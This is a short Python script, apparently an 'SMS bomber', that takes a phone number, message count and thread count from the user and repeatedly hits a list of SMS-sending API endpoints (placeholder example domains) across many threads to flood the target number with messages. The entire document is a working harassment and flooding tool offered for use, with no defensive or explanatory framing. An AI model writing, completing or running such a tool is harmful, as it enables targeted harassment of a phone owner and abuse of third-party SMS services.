import requests
import threading
import time
import random

apis = [
    "https://api.example1.com/send?phone={phone}",
    "https://api.example2.com/sms?number={phone}",
    "https://api.example3.com/send?to={phone}",
]

def send_sms(phone):
    for api in apis:
        try:
            url = api.format(phone=phone)
            requests.get(url, timeout=5)
            print(f"[+] Sent to {phone}")
        except:
            pass

def bomber(phone, amount, threads):
    def worker():
        for _ in range(amount // threads):
            send_sms(phone)
            time.sleep(0.1)
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("\n[+] Done.")

phone = input("[?] Enter number: ")
amount = int(input("[?] Enter amount: "))
threads = int(input("[?] Enter threads: "))
bomber(phone, amount, threads)
